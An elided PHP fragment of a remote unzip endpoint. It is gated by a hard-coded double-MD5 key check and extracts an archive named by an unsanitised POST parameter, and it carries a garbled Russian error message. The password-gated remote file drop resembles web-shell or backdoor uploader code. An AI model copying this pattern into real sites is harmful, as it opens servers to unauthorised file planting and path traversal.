...
if(md5(md5(trim($_POST['kk']))) != "9b95aa77773140566b8e42f248116c7a") die("BAD KEY");
...
$archive = new PclZip($dir.'/'.trim($_POST['fn']));

$ret = $archive->extract();

if($ret == 0) $out = "UNZIP ERROR";

else { $out = trim($_POST['fn']) . " UNZIPPED"; }
	...
	*/
	...
	function createPclZip() {
		...
		if (!function_exists('gzopen')) {
			...
			echo "ZLib íå îáíàðóæåíà, ðàáîòà ñ àðõèâàìè íå âîçìîæíà";
